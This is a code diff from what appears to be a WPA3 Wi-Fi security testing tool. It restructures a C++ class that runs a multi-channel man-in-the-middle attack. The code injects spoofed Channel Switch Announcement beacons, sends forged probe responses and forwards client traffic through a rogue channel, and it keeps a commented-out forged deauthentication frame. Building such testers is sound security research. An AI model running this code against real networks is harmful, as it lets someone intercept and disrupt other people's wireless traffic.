@@ -35,14 +35,6 @@ namespace wpa3_tester{
         return duration<double>(steady_clock::now().time_since_epoch()).count();
     }
 
-    void McMitm::add_client(unique_ptr<ClientState> client) {
-        clients[client->macaddr] = std::move(client);
-    }
-
-    void McMitm::del_client(const string& mac) {
-        clients.erase(mac);
-    }
-
     ClientState* McMitm::find_client(const string& mac) {
         const auto it = clients.find(mac);
         return (it != clients.end()) ? it->second.get() : nullptr;
@@ -67,77 +59,95 @@ namespace wpa3_tester{
         return 0;
     }
 
-    string McMitm::frame_to_str(const Dot11& pkt) {
-        ostringstream ss;
+    void McMitm::run(const int timeout_sec) {
+        probe_resp.reset(beacon_to_probe_resp(*beacon));
 
-        if (pkt.type() == Dot11::MANAGEMENT) {
-            const auto sub = pkt.subtype();
-            if (sub == Dot11::BEACON)      { ss << "Beacon(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }
-            if (sub == Dot11::PROBE_REQ)   { ss << "ProbeReq(seq="   << get_seq_num(pkt) << ")"; return ss.str(); }
-            if (sub == Dot11::PROBE_RESP)  { ss << "ProbeResp(seq="  << get_seq_num(pkt) << ")"; return ss.str(); }
-            if (sub == Dot11::AUTH)        { ss << "Auth(seq="       << get_seq_num(pkt) << ")"; return ss.str(); }
-            if (sub == Dot11::DEAUTH)      { ss << "Deauth(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }
-            if (sub == Dot11::ASSOC_REQ)   { ss << "AssoReq(seq="    << get_seq_num(pkt) << ")"; return ss.str(); }
-            if (sub == Dot11::REASSOC_REQ) { ss << "ReassoReq(seq="  << get_seq_num(pkt) << ")"; return ss.str(); }
-            if (sub == Dot11::ASSOC_RESP)  { ss << "AssoResp(seq="   << get_seq_num(pkt) << ")"; return ss.str(); }
-            if (sub == Dot11::REASSOC_RESP){ ss << "ReassoResp(seq=" << get_seq_num(pkt) << ")"; return ss.str(); }
-            if (sub == Dot11::DISASSOC)    { ss << "Disas(seq="      << get_seq_num(pkt) << ")"; return ss.str(); }
-            if (sub == 13)                       { ss << "Action(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }
+        //FIXME this should be optimalization, how it should works?
+        /*Dot11Deauthentication deauth;
+        deauth.addr1(HWAddress<6>("ff:ff:ff:ff:ff:ff"));
+        deauth.addr2(HWAddress<6>(ap_mac));
+        deauth.addr3(HWAddress<6>(ap_mac));
+        deauth.reason_code(3);
+        RadioTap radio = RadioTap() / deauth;
+        sender_real->send(radio, nic_real_mon);*/
 
-        } else if (pkt.type() == Dot11::CONTROL) {
-            if (pkt.subtype() == Dot11::BLOCK_ACK) return "BlockAck";
-            if (pkt.subtype() == Dot11::RTS)       return "RTS";
-            if (pkt.subtype() == Dot11::ACK)       return "Ack";
-
-        } else if (pkt.type() == Dot11::DATA) {
-            if (pkt.subtype() == Dot11::DATA_NULL)
-                { ss << "Null(seq="    << get_seq_num(pkt) << ")"; return ss.str(); }
-            if (pkt.subtype() == Dot11::QOS_DATA_NULL)
-                { ss << "QoS-Null(seq=" << get_seq_num(pkt) << ")"; return ss.str(); }
+        if (!sniffer_real || !sniffer_rogue) {
+            log(LogLevel::ERROR, "Sniffers not initialized before run()");
+            return;
+        }
+        if (!beacon) {
+            log(LogLevel::ERROR, "Beacon not set before run()");
+            return;
         }
 
-        ss << "Frame(type=" << pkt.type() << ",sub=" << pkt.subtype() << ")";
-        return ss.str();
-    }
-
-    void McMitm::print_rx(const LogLevel level, const string& prefix,
-                          const Dot11& pkt, const string& suffix) {
-        if (pkt.type() == Dot11::CONTROL) return;
-
-        string addr2;
-        if (const auto* mgmt = pkt.find_pdu<Dot11ManagementFrame>()) {
-            addr2 = mgmt->addr2().to_string();
-        } else if (const auto* data = pkt.find_pdu<Dot11Data>()) {
-            addr2 = data->addr2().to_string();
+        for (int i = 0; i < 5; ++i) {
+            CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid,
+                                        netconfig.real_channel, netconfig.rogue_channel, 1);
+            this_thread::sleep_for(milliseconds(20));
         }
-        string msg = prefix + ": " +addr2 + " -> " +
-                     pkt.addr1().to_string() + ": " + frame_to_str(pkt);
-        if (!suffix.empty()) msg += suffix;
-        log(level, msg);
-    }
 
-    double McMitm::display_client_traffic(const Dot11& pkt,
-                                          const string& prefix,
-                                          const double prevtime,
-                                          const string& suffix) {
-        const bool is_data = (pkt.type() == Dot11::DATA);
-        const bool is_null = is_data && (pkt.subtype() == Dot11::DATA_NULL ||
-                                         pkt.subtype() == Dot11::QOS_DATA_NULL);
+       // CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid,
+       //                             netconfig.real_channel, netconfig.rogue_channel);
 
-        bool is_eapol = false;
-        if (const auto* raw = pkt.find_pdu<RawPDU>()) {
-            const auto& d = raw->payload();
-            for (size_t i = 0; i + 1 < min(d.size(), static_cast<size_t>(16)); i++) {
-                if (d[i] == 0x88 && d[i+1] == 0x8e) { is_eapol = true; break; }
+        last_real_beacon  = now_sec();
+        last_rogue_beacon = now_sec();
+        double next_beacon  = now_sec() + 0.01;
+        const double deadline = (timeout_sec > 0) ? now_sec() + timeout_sec : -1.0;
+
+        while (true) {
+            if (deadline > 0 && now_sec() > deadline) {
+                log(LogLevel::INFO, "McMitm timeout reached, stopping.");
+                break;
             }
+
+            auto try_sniff = [&](Sniffer& sniffer, void (McMitm::*handler)(PDU&)) {
+                if (PDU* pdu = sniffer.next_packet()) {
+                    (this->*handler)(*pdu);
+                    delete pdu;
+                }
+            };
+
+            try_sniff(*sniffer_real,  &McMitm::handle_rx_real_chan);
+            try_sniff(*sniffer_rogue, &McMitm::handle_rx_rogue_chan);
+
+            /*while (!disas_queue.empty() && disas_queue.top().first <= now_sec()) {
+                string mac = disas_queue.top().second;
+                disas_queue.pop();
+                send_disas(mac);
+            }*/
+
+            if (next_beacon <= now_sec()) {
+                CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
+                next_beacon += 0.10;
+            }
+
+            if (last_real_beacon + 2.0 < now_sec()) {
+                log(LogLevel::WARNING, "Didn't receive beacon from real AP for two seconds");
+                last_real_beacon = now_sec();
+            }
+            if (last_rogue_beacon + 2.0 < now_sec()) {
+                log(LogLevel::WARNING, "Didn't receive beacon from rogue AP for two seconds");
+                last_rogue_beacon = now_sec();
+            }
+            this_thread::sleep_for(milliseconds(1));
         }
+    }
 
-        if (is_eapol)     print_rx(LogLevel::INFO,  prefix, pkt, suffix);
-        else if (is_null) print_rx(LogLevel::DEBUG, prefix, pkt, suffix);
-        else if (is_data) print_rx(LogLevel::INFO,  prefix, pkt, suffix);
-        else              print_rx(LogLevel::DEBUG, prefix, pkt, suffix);
+    void McMitm::stop() {
+        log(LogLevel::INFO, "Cleaning up ...");
+        sniffer_real.reset();
+        sniffer_rogue.reset();
+        sender_real.reset();
+        sender_rogue.reset();
+    }
 
-        return prevtime;
+    void McMitm::setup_ifaces(const ActorPtr &att_real, const string &client_mac, const ActorPtr &att_rogue, const string &ap_mac){
+        att_real->setup_mac_addr(client_mac);
+        att_rogue->setup_mac_addr(ap_mac);
+        att_real->up_iface();
+        att_rogue->up_iface();
+        att_real->up_sniff_iface();
+        att_rogue->up_sniff_iface();
     }
 
     void McMitm::handle_rx_real_chan(PDU& pdu) {
@@ -168,18 +178,18 @@ namespace wpa3_tester{
                 if (client_mac == addr2)
                     log(LogLevel::WARNING, "Client "+client_mac+" is connecting on real channel, injecting CSA beacon to try to correct.");
 
-                del_client(addr2);
-                CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel);
-                CSA_attack::send_CSA_beacon("ff:ff:ff:ff:ff:ff", nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel);
+                clients.erase(addr2);
+                CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
+                CSA_attack::send_CSA_beacon("ff:ff:ff:ff:ff:ff", nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
 
                 auto client = make_unique<ClientState>(addr2);
                 client->update_state(ClientState::Connecting);
-                add_client(std::move(client));
+                clients[client->macaddr] = std::move(client);
 
             } else if (dot11->type() == Dot11::MANAGEMENT &&
                        (dot11->subtype() == Dot11::DEAUTH || dot11->subtype() == Dot11::DISASSOC)) {
                 print_rx(LogLevel::INFO, "Real channel", *dot11);
-                del_client(addr2);
+                 clients.erase(addr2);
 
             } else if (auto* client = find_client(addr2)) {
                 client->last_real = display_client_traffic(*dot11, "Real channel", client->last_real);
@@ -228,7 +238,7 @@ namespace wpa3_tester{
                 print_rx(LogLevel::INFO, "Real channel", *dot11, might_forward ? " -- MitM'ing" : "");
             } else if (!client_mac.empty() && client_mac == addr1) {
                 last_print_rogue_chan = display_client_traffic(*dot11, "Real channel",
-                                        last_print_rogue_chan, might_forward ? " -- MitM'ing" : "");
+                                                               last_print_rogue_chan, might_forward ? " -- MitM'ing" : "");
             } else if (might_forward) {
                 print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM");
             }
@@ -280,6 +290,8 @@ namespace wpa3_tester{
 
         // 2. Probe requests on rogue channel
         if (dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == Dot11::PROBE_REQ) {
+            CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid,
+                            netconfig.real_channel, netconfig.rogue_channel, 1);
             probe_resp->addr1(HWAddress<6>(addr2));
             sender_rogue->send(*probe_resp, nic_rogue_mon);
             last_print_real_chan = display_client_traffic(*dot11, "Rogue channel", last_print_real_chan, " -- Replied");
@@ -302,7 +314,7 @@ namespace wpa3_tester{
                     client->mark_got_mitm();
                 } else {
                     client->last_rogue = display_client_traffic(*dot11, "Rogue channel",
-                                            client->last_rogue, " -- MitM'ing");
+                                                                client->last_rogue, " -- MitM'ing");
                 }
             } else if (is_auth_or_asso || dot11->type() == Dot11::DATA) {
                 print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
@@ -329,79 +341,77 @@ namespace wpa3_tester{
             last_print_real_chan = display_client_traffic(*dot11, "Rogue channel", last_print_real_chan);
     }
 
-    void McMitm::run(const int timeout_sec) {
-        probe_resp.reset(beacon_to_probe_resp(*beacon));
+    string McMitm::frame_to_str(const Dot11& pkt) {
+        ostringstream ss;
 
-        //FIXME this should be optimalization, how it should works?
-        /*Dot11Deauthentication deauth;
-        deauth.addr1(HWAddress<6>("ff:ff:ff:ff:ff:ff"));
-        deauth.addr2(HWAddress<6>(ap_mac));
-        deauth.addr3(HWAddress<6>(ap_mac));
-        deauth.reason_code(3);
-        RadioTap radio = RadioTap() / deauth;
-        sender_real->send(radio, nic_real_mon);*/
+        if (pkt.type() == Dot11::MANAGEMENT) {
+            const auto sub = pkt.subtype();
+            if (sub == Dot11::BEACON)      { ss << "Beacon(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }
+            if (sub == Dot11::PROBE_REQ)   { ss << "ProbeReq(seq="   << get_seq_num(pkt) << ")"; return ss.str(); }
+            if (sub == Dot11::PROBE_RESP)  { ss << "ProbeResp(seq="  << get_seq_num(pkt) << ")"; return ss.str(); }
+            if (sub == Dot11::AUTH)        { ss << "Auth(seq="       << get_seq_num(pkt) << ")"; return ss.str(); }
+            if (sub == Dot11::DEAUTH)      { ss << "Deauth(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }
+            if (sub == Dot11::ASSOC_REQ)   { ss << "AssoReq(seq="    << get_seq_num(pkt) << ")"; return ss.str(); }
+            if (sub == Dot11::REASSOC_REQ) { ss << "ReassoReq(seq="  << get_seq_num(pkt) << ")"; return ss.str(); }
+            if (sub == Dot11::ASSOC_RESP)  { ss << "AssoResp(seq="   << get_seq_num(pkt) << ")"; return ss.str(); }
+            if (sub == Dot11::REASSOC_RESP){ ss << "ReassoResp(seq=" << get_seq_num(pkt) << ")"; return ss.str(); }
+            if (sub == Dot11::DISASSOC)    { ss << "Disas(seq="      << get_seq_num(pkt) << ")"; return ss.str(); }
+            if (sub == 13)                       { ss << "Action(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }
 
-        if (!sniffer_real || !sniffer_rogue) {
-            log(LogLevel::ERROR, "Sniffers not initialized before run()");
-            return;
+        } else if (pkt.type() == Dot11::CONTROL) {
+            if (pkt.subtype() == Dot11::BLOCK_ACK) return "BlockAck";
+            if (pkt.subtype() == Dot11::RTS)       return "RTS";
+            if (pkt.subtype() == Dot11::ACK)       return "Ack";
+
+        } else if (pkt.type() == Dot11::DATA) {
+            if (pkt.subtype() == Dot11::DATA_NULL)
+            { ss << "Null(seq="    << get_seq_num(pkt) << ")"; return ss.str(); }
+            if (pkt.subtype() == Dot11::QOS_DATA_NULL)
+            { ss << "QoS-Null(seq=" << get_seq_num(pkt) << ")"; return ss.str(); }
         }
-        if (!beacon) {
-            log(LogLevel::ERROR, "Beacon not set before run()");
-            return;
-        }
 
-        CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid,
-            netconfig.real_channel, netconfig.rogue_channel);
-
-        last_real_beacon  = now_sec();
-        last_rogue_beacon = now_sec();
-        double next_beacon  = now_sec() + 0.01;
-        const double deadline = (timeout_sec > 0) ? now_sec() + timeout_sec : -1.0;
-
-        while (true) {
-            if (deadline > 0 && now_sec() > deadline) {
-                log(LogLevel::INFO, "McMitm timeout reached, stopping.");
-                break;
-            }
-
-            auto try_sniff = [&](Sniffer& sniffer, void (McMitm::*handler)(PDU&)) {
-                if (PDU* pdu = sniffer.next_packet()) {
-                    (this->*handler)(*pdu);
-                    delete pdu;
-                }
-            };
-
-            try_sniff(*sniffer_real,  &McMitm::handle_rx_real_chan);
-            try_sniff(*sniffer_rogue, &McMitm::handle_rx_rogue_chan);
-
-            while (!disas_queue.empty() && disas_queue.top().first <= now_sec()) {
-                string mac = disas_queue.top().second;
-                disas_queue.pop();
-                send_disas(mac);
-            }
-
-            if (next_beacon <= now_sec()) {
-                CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel);
-                next_beacon += 0.10;
-            }
-
-            if (last_real_beacon + 2.0 < now_sec()) {
-                log(LogLevel::WARNING, "Didn't receive beacon from real AP for two seconds");
-                last_real_beacon = now_sec();
-            }
-            if (last_rogue_beacon + 2.0 < now_sec()) {
-                log(LogLevel::WARNING, "Didn't receive beacon from rogue AP for two seconds");
-                last_rogue_beacon = now_sec();
-            }
-            this_thread::sleep_for(milliseconds(1));
-        }
+        ss << "Frame(type=" << pkt.type() << ",sub=" << pkt.subtype() << ")";
+        return ss.str();
     }
 
-    void McMitm::stop() {
-        log(LogLevel::INFO, "Cleaning up ...");
-        sniffer_real.reset();
-        sniffer_rogue.reset();
-        sender_real.reset();
-        sender_rogue.reset();
+    void McMitm::print_rx(const LogLevel level, const string& prefix,
+                          const Dot11& pkt, const string& suffix) {
+        if (pkt.type() == Dot11::CONTROL) return;
+
+        string addr2;
+        if (const auto* mgmt = pkt.find_pdu<Dot11ManagementFrame>()) {
+            addr2 = mgmt->addr2().to_string();
+        } else if (const auto* data = pkt.find_pdu<Dot11Data>()) {
+            addr2 = data->addr2().to_string();
+        }
+        string msg = prefix + ": " +addr2 + " -> " +
+                     pkt.addr1().to_string() + ": " + frame_to_str(pkt);
+        if (!suffix.empty()) msg += suffix;
+        log(level, msg);
     }
+
+    double McMitm::display_client_traffic(const Dot11& pkt,
+                                          const string& prefix,
+                                          const double prevtime,
+                                          const string& suffix) {
+        const bool is_data = (pkt.type() == Dot11::DATA);
+        const bool is_null = is_data && (pkt.subtype() == Dot11::DATA_NULL ||
+                                         pkt.subtype() == Dot11::QOS_DATA_NULL);
+
+        bool is_eapol = false;
+        if (const auto* raw = pkt.find_pdu<RawPDU>()) {
+            const auto& d = raw->payload();
+            for (size_t i = 0; i + 1 < min(d.size(), static_cast<size_t>(16)); i++) {
+                if (d[i] == 0x88 && d[i+1] == 0x8e) { is_eapol = true; break; }
+            }
+        }
+
+        if (is_eapol)     print_rx(LogLevel::INFO,  prefix, pkt, suffix);
+        else if (is_null) print_rx(LogLevel::DEBUG, prefix, pkt, suffix);
+        else if (is_data) print_rx(LogLevel::INFO,  prefix, pkt, suffix);
+        else              print_rx(LogLevel::DEBUG, prefix, pkt, suffix);
+
+        return prevtime;
+    }
+
 }
